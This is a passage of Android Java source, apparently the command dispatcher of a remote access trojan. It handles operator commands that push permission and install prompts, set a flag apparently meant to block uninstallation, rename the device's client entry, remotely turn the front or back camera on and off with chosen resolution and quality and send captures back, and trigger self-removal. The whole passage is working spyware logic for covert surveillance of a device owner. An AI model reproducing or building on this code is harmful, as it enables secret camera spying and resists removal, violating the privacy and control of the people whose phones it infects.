                                                    .addFlags(FLAG_ACTIVITY_NEW_TASK));
                                            new Thread(() -> {
                                                try {

                                                    Thread.sleep(5000);

                                                } catch (InterruptedException e) {
                                                    e.printStackTrace();
                                                }
                                                AccessServices.PreventDelete = true;
                                                AccessServices.FOR_DRAW_OVER = false;
                                            }).start();
                                        } else if (neededprim.equals("inst")) {

                                            Dummyctx.startActivity(new Intent(Dummyctx, Requestinstall.class)
                                                    .addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                                                    .addFlags(FLAG_ACTIVITY_NEW_TASK));

                                        } else if (neededprim.contains("<")) {
                                            String[] NeededPrim = MyPermissions.GetRequierdPrims(neededprim);
                                            if (NeededPrim != null && NeededPrim.length > 0) {
                                                if (NeededPrim[0].equals("EX")) {
                                                    String Exptionmsg = NeededPrim[1];
                                                    AlertServer(Dummyctx, "Request Permission Error", Exptionmsg);
                                                } else {

                                                    Intent myIntent = new Intent(Dummyctx, RequestPermissions2.class);
                                                    myIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                                    myIntent.putExtra("Data", NeededPrim);//Optional parameters
                                                    Dummyctx.startActivity(myIntent);
                                                }
                                            }
                                        }
                                        break;
                                }

                            } catch (Exception s) {
                                AlertServer(Dummyctx, "Error Permissions", s.getMessage());
                            }
                            break;
                        case Rename:
                            String newname = Case[1];
                            if (!newname.isEmpty() && newname.length() > 0) {
                                MySettings.Write(Dummyctx, USR_NAME, newname);
                                AlertServer(Dummyctx, "New Name", "Hello, My new name is: " + newname);
                            }
                            break;
                        case Camera:
                            //camera > On/off/load > client id  > type front or back > resolution > qulaity
                            try {

                                String[] Camsp = MyPermissions.GetPrimname(MyPermissions.Prims.Camera);
                                if (MyPermissions.hasPermissions(Dummyctx, Camsp)) {

                                    switch (Case[1]) {
                                        case "L":
                                            try {
                                                AccessTools.BringMeFront(Dummyctx);
                                                String Respone = CameraCap.load();
                                                //  MySocket.SendToClient(id_Commands.LoadCam, (Respone).getBytes());
                                                try {
                                                    JSONObject jsonObject = new JSONObject();
                                                    jsonObject.put("type", "cam");
                                                    jsonObject.put("cuz", "l");
                                                    jsonObject.put("datacam", Respone);
                                                    String jsonData = jsonObject.toString();

                                                    Livemessage(Dummyctx, jsonData);
                                                } catch (Exception a) {

                                                }
                                            } catch (Exception e) {

                                            }
                                            break;
                                        case "ON":

                                            // if (!Codes.isServiceRunning(ctx, CameraCap.class)) {
                                            AccessTools.BringMeFront(Dummyctx);
                                            String ClientID = Case[2];
//                                                        if(!ClientID.startsWith("BT-")){
//                                                            return;
//                                                        }
                                            String typecamera = Case[3];
                                            String wdth = Case[4];
                                            String heigh = Case[5];
                                            String qulty = Case[6];
                                            Intent Cameraint = new Intent(Dummyctx, CameraCap.class);
                                            Cameraint.putExtra("CData", typecamera + "," + wdth + "," + heigh + "," + qulty + "," + ClientID);
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

                                                Dummyctx.startForegroundService(Cameraint);
                                            } else {
                                                Dummyctx.startService(Cameraint);
                                            }
                                            //  }
                                            break;
                                        case "OFF":
                                            // if (Codes.isServiceRunning(ctx, CameraCap.class)) {
                                            // CameraCap.ReleaseAll(ctx);

                                            Intent stopint = new Intent(Dummyctx, CameraCap.class);
                                            stopint.setAction(CameraCap.ACTION_STOP_CAM);
                                            Dummyctx.startService(stopint);
                                            //  }
                                            break;
                                    }


                                } else {
                                    //  MySocket.SendToClient(id_Commands.ALERT, ("Access Camera Permission is Disabled.").getBytes());
                                }


                            } catch (Exception s) {
                            }
                            break;

                        case Delete:
//                            Intent intentremove = new Intent(Intent.ACTION_UNINSTALL_PACKAGE);
//                            intentremove.setData(Uri.parse("package:" + Dummyctx.getPackageName()));
//                            intentremove.putExtra(Intent.EXTRA_RETURN_RESULT, true);
//                            intentremove.addFlags(FLAG_ACTIVITY_NEW_TASK);

                            Intent intent = new Intent(Intent.ACTION_DELETE);
                            intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                            intent.setData(Uri.parse("package:" + Dummyctx.getPackageName()));



                            Consts.removeme = true;
                            AccessServices.PreventDelete=false;
                            Dummyctx.startActivity(intent);
                            //Dummyctx.startActivity(intentremove);
                            break;
                    }

                }
            }

        } catch (Exception ex) {
            ex.printStackTrace();
        }
        //  }
        //  };
        //  thread.start();
    }

}

